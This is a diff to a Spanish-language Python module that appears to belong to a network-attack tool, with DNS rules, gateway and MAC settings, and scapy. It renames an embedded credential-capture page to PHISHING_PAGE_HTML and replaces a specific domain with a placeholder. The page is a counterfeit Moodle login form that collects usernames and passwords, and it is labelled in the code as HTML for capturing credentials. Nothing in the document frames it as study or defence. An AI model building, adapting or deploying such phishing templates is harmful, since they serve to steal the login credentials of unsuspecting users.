@@ -9,7 +9,7 @@ import queue
 
 __all__ = [
     '_estado', '_dns_reglas', 'MAC', 'GATEWAY', 'IP_LOCAL', 'DIR_BASE',
-    'SCAPY_OK', 'PSUTIL_OK', 'COL', 'MOGAH_HTML'
+    'SCAPY_OK', 'PSUTIL_OK', 'COL', 'PHISHING_PAGE_HTML'
 ]
 
 # Estado global de hilos
@@ -36,13 +36,13 @@ COL = {
 }
 
 # HTML para captura de credenciales
-MOGAH_HTML = """\
+PHISHING_PAGE_HTML = """\
 <!DOCTYPE html>
 <html lang="es">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Moodle — mogah.pro</title>
+  <title>Moodle — tu-dominio.com</title>
   <style>
     *{box-sizing:border-box;margin:0;padding:0}
     body{background:#f4f4f4;font-family:'Segoe UI',Arial,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
@@ -77,7 +77,7 @@ MOGAH_HTML = """\
       <input type="password" id="password" name="password" placeholder="Introduce tu contraseña" required>
       <button type="submit">Acceder</button>
     </form>
-    <p class="footer">mogah.pro &copy; 2025 — Plataforma educativa</p>
+    <p class="footer">tu-dominio.com &copy; 2025 — Plataforma educativa</p>
   </div>
 </body>
 </html>
